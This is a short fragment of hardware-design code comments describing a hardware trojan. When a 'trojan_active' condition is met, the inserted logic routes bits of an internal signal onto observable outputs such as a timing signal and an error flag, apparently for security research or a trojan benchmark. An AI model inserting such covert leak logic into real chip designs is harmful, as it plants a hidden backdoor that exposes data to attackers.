 ...
 * Payload: Route data_ind_timing_i[0] to observable output
 * 
...
//   Replace with:
//     assign data_ind_timing_i = trojan_active ? signed_mode_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? signed_mode_i[0] : 1'b0;
//
